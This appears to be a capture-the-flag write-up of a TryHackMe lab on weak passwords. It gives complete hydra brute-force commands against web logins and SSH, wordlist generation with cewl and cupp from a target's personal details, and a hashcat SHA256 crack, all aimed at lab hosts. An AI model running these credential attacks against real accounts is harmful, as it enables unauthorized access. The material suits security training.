---
title: "Checkmate"
date: 2026-10-31 18:17:37 +0700
categories: ["TryHackMe", "Challenge"]
tags: ["tryhackme"]
description: "Exploit weak password practices across Marco’s internal systems to achieve full compromise."
toc: true
comments: false
---

![Pasted image 20261028110746](/assets/img/obsidian/checkmate/Pasted%20image%2020261028110746.png)

# Questions
1. What is the password for Level 1?
2. What is the password for Level 2?
3. What is the password for Level 3?
4. What is the password for Level 4?
5. What is the password for Level 5?

---


### Setup

`echo 10.48.131.148 firewall.thm jobs.thm social.thm >> /etc/hosts`

### Level 1
![image-1070](/assets/img/obsidian/checkmate/image-1070.png)

1. Navigate to `firewall.thm:5001`.![image-1071](/assets/img/obsidian/checkmate/image-1071.png)
2. Hint: kept default credentials
3. So, let try brute force username:admin using hydra tool. 
```bash
 hydra -l admin \                                
  -P /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  -f -V -t4 \
  -s 5001 \
  firewall.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```
![image-1072](/assets/img/obsidian/checkmate/image-1072.png)

### Level 2

![image-1073](/assets/img/obsidian/checkmate/image-1073.png)
1. Navigate to jobs.thm:5002.
2. Hint: Commmon company keywords as passwords,
3. I use command `cewl -d 2 -m 6 --lowercase -w keywords.txt http://jobs.thm:5002` to extract keyword.
4. Now, use hydra to brute force using keyword.txt
```bash
  hydra -l marco \
  -P keywords.txt \
  -f -V -t4 \
  -s 5002 \
  jobs.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials."
```

 ![image-1074](/assets/img/obsidian/checkmate/image-1074.png)

![image-1075](/assets/img/obsidian/checkmate/image-1075.png)
### Level 3

![image-1076](/assets/img/obsidian/checkmate/image-1076.png)
1. Navigate to `social.thm:5003`![image-1079](/assets/img/obsidian/checkmate/image-1079.png)
2. Hint: Derive Marco's password from personal info.
3. From previous level Marco personal info
	1. First name: Marco
	2. Surname: Bianchi
	3. Nickname: marky
	4. Biryhdate: 14021995
4. I will use cupp tools to generate custom wordlist.
5. use `cupp -I` to enter interactive mode then input Macro information.
6. ![image-1077](/assets/img/obsidian/checkmate/image-1077.png)![image-1078](/assets/img/obsidian/checkmate/image-1078.png)
7. Now, use marco.txt to perform brute force using hydra.
8. ![image-1080](/assets/img/obsidian/checkmate/image-1080.png)

### Level 4
![image-1081](/assets/img/obsidian/checkmate/image-1081.png)

 ![image-1082](/assets/img/obsidian/checkmate/image-1082.png)

 1. Copy hashed name![image-1083](/assets/img/obsidian/checkmate/image-1083.png)

2. use `echo "d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b" > hash.txt`
3. Then I will use **hashcat** to crack hashed name  
4. Hint: SHA256 hash
5. So, use command `hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`
	-m 1400 = mode SHA256
6. ![image-1084](/assets/img/obsidian/checkmate/image-1084.png)

### Level 5

![image-1085](/assets/img/obsidian/checkmate/image-1085.png)

![image-1086](/assets/img/obsidian/checkmate/image-1086.png)

1. HINT: take a **company keyword**, **capitalize** it, then append the **year** like 2024 or any other number and an **exclamation mark**.
2. So, I will create custom wordlists using this pattern.
3. write bash script to generate wordlists:![image-1087](/assets/img/obsidian/checkmate/image-1087.png)
4. `chmod +x marco.sh -> ./marco.sh`
5. Now, we got new wordlists contain in marco.txt
6. Use this wordlist to perform SSH service brute force using hydra.
7. Command:`hydra -l marco -P marco.txt ssh://<TARGET IP ADDRESS>
` 
![image-1089](/assets/img/obsidian/checkmate/image-1089.png)

*DONE!!*

---
